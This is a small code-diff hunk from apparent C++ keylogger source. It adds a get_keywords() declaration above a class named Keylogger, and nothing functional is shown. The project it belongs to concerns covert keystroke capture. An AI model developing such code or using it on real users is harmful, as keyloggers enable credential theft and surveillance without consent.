@@ -8,6 +8,8 @@
 #define DEBUG
 //#define DEBUG_TO_LOGS
 
+std::vector<std::string> get_keywords();
+
 class Keylogger
 {
 private:
